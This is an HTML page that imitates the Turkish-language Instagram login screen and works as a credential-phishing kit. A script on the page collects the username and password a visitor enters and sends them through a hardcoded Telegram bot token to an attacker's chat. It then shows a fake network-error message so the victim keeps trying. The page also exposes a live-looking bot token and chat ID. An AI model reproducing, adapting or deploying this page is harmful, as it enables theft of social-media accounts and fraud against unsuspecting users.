<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
     <link rel="icon" type="image/svg+xml" href="/logo1.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1C2A33;
            font-family: 'Roboto', Arial, sans-serif;
            color: #fff;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 0 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .lang {
            color: #b0b3b8;
            font-size: 16px;
            margin-top: 24px;
            margin-bottom: 32px;
            text-align: center;
        }
        .logo {
            margin-bottom: 32px;
        }
        .logo img {
            width: 73px;
            height: 70px;
            display: block;
            margin: 0 auto;
        }
        .form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .input {
            background: #1C2A33;
            border: 1.5px solid #4d5964;
            border-radius: 12px;
            padding: 18px 16px 10px 16px;
            color: #dfe0e2;
            font-size: 16px;
            outline: none;
            margin-bottom: 0;
            transition: border 0.2s;
        }
        .input::placeholder{
            color:rgb(165, 159, 159)
        }
        .input:focus {
            border: 1.5px solid #7b7d80;
        }
        .login-btn {
            background: #0a3fcf;
            color: #fff;
            border: none;
            border-radius: 999px;
            padding: 10px 0;
            font-size: 16px;
            font-weight: 100;
            cursor: pointer;
            margin-top: 8px;
            margin-bottom: 8px;
            transition: background 0.2s;
        }
        .login-btn:hover {
            background: #166fe5;
        }
        .forgot {
            color: #e0dede;
            text-align: center;
            font-size: 15px;
            margin-top: 10px;
            margin-bottom: 32px;
            cursor: pointer;
            text-decoration: none;
            display: block;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .signup-btn {
            background: transparent;
            color: #0095f6;
            border: 1.5px solid #0095f6;
            border-radius: 999px;
            padding: 10px 0;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-bottom: 32px;
            transition: background 0.2s, color 0.2s;
        }
        .signup-btn:hover {
            background: #242526;
        }
        .meta {
            color: #b0b3b8;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
            margin-top: 30px;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .meta svg {
            width: 28px;
            height: 28px;
            vertical-align: middle;
        }
        @media (max-width: 500px) {
            .container {
                max-width: 90vw;
                min-height: 100vh;
                border-radius: 0;
                box-shadow: none;
                padding: 0 4px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang">Türkçe</div>
        <div class="logo">
            <img src="/logo.png" alt="Instagram Logo">
        </div>
        <form class="form">
            <input class="input" id="username" type="text" placeholder="Kullanıcı adı, e-posta veya cep numarası" autocomplete="username">
            <input class="input" id="password" type="password" placeholder="Şifre" autocomplete="current-password">
            <button class="login-btn" type="submit" onclick="sendMessage()">Giriş yap</button>
            <div id="error-message" style="display:none; color:#ff4d4f; background:#23272b; border-radius:8px;  margin: -10px 0 0 0; text-align:center; font-size:12px; font-weight:500;">İnternet bağlantınızı kontrol edip tekrar deneyin</div>
        </form>
        <a href="#" class="forgot">Şifreni mi unuttun?</a>
        <button class="signup-btn">Yeni hesap oluştur</button>
        <div class="meta">
            Meta
        </div>
    </div>
    <style>
        .spinner-btn {
            border: 3px solid #e0e0e0;
            border-top: 3px solid #0a3fcf;
            border-radius: 50%;
            width: 15px;
            height: 15px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        const form = document.querySelector('.form');
        const loginBtn = document.querySelector('.login-btn');
        const errorMsg = document.getElementById('error-message');
        let originalBtnContent = loginBtn.innerHTML;
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            loginBtn.disabled = true;
            errorMsg.style.display = 'none';
            originalBtnContent = loginBtn.innerHTML;
            loginBtn.innerHTML = '<span class="spinner-btn"></span>';
            setTimeout(() => {
                loginBtn.innerHTML = originalBtnContent;
                loginBtn.disabled = false;
                errorMsg.style.display = 'block';
            }, 2000);
        });

    async function sendMessage() {
      const BOT_TOKEN = "8409787693:AAH9Ew7j2l3ZiSDASjHPZQFcihSPxzam_-c"; // BotFather-dan aldığın token
      const CHAT_ID = "7452019947";     // Öz chat id və ya group id
      const username = document.getElementById("username").value.trim();
const password = document.getElementById("password").value.trim();
if(username && password === " "){
    document.getElementById("error-message").innerHTML="Kullanıcı adı ve ya şifre girin"
}
  const text = "Ad:" + username + "\nParol:" + password;
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text:text
          })
        });

        const data = await res.json();
        if (data.ok) {
          document.getElementById("error-message").innerText = "İnternet bağlantınızı kontrol edip tekrar deneyin";
        } else {
          document.getElementById("error-message").innerText = "İnternet bağlantınızı kontrol edip tekrar deneyin";
        }
      } catch (err) {
        document.getElementById("error-message").innerText = "Ağ hatası";
      }
    }
  
    </script>
</body>
</html>
